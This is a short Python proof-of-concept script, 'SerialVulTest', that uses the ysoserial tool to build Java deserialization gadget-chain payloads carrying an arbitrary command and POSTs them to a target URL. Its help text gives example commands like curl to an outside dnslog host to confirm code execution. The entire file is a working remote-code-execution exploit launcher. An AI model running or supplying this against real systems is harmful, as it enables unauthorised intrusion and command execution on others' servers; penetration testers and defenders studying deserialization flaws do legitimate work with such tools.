import requests
import subprocess
import argparse

def get_payload(JAR_FILE, gadget, command):
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def poc(url, data):
    try:
        res = requests.post(url=url, data=data)
        print(" poc发送成功,响应码：{0}".format(res.status_code))
    except Exception as e:
        print(e)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SerialVulTest")
    parser.add_argument("-u", "--url", type=str, help="Vul URL")
    parser.add_argument("-f", "--file", type=str, help="The local Ysoserial.jar Path")
    parser.add_argument("-g", "--gadget", type=str, help="Ysoserial.jar Gadget, Example: URLDNS or Jdk7u21 ...")
    parser.add_argument("-c", "--command", type=str, help="Ysoserial Command, Example: http://xxxx.dnslog.cn or curl http://xxxx.dnslog.cn   ...")
    args = parser.parse_args()
    try:
        url = args.url
        JAR_FILE = args.file
        gadget = args.gadget
        command = args.command
        payload = get_payload(JAR_FILE, gadget, command)
        poc(url, data=payload)
    except Exception as e:
        print(e)